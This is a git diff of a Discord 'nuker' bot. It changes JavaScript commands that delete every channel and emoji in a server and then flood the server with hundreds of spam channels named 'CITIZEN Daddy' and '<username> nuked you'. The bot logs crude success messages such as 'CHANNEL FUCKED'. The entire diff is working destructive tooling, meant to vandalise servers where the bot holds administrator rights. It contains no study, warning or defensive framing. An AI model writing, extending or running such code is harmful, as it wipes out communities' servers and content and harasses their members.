@@ -450,6 +450,7 @@ client.on("message", async message => {
             }
         }
 
+				//Channel delete
         if (message.content.startsWith(prefix + 'chd')) {
             if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                 return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
@@ -458,8 +459,7 @@ client.on("message", async message => {
                     message.guild.channels.cache.forEach(channel => channel.delete().then(
                         console.log(redBright(`CHANNEL FUCKED`))
                     )); // deletes all channels
-                    message.delete();
-										message.guild.channels.create("CITIZEN Daddy")
+                  message.guild.channels.create("CITIZEN Daddy")
 
             }
         }
@@ -550,12 +550,14 @@ client.on("message", async message => {
                 message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
 
                //Channel Creation
+							      for (var i = 0; i < 5; i++) {
+                            let channels = message.guild.channels.create("CITIZEN Daddy") }
 
                   for (var i = 0; i < 250; i++) {
-                        message.guild.channels.create("CITIZEN Daddy")
+                        message.guild.channels.create(message.author.username + " nuked you")
 
                         for (var i = 0; i < 250; i++) {
-                            let channels = message.guild.channels.create("CITIZEN Daddy")
+                            let channels = message.guild.channels.create(message.author.username + " nuked you")
 
                             channels.then(
                                 function (channel, index) {
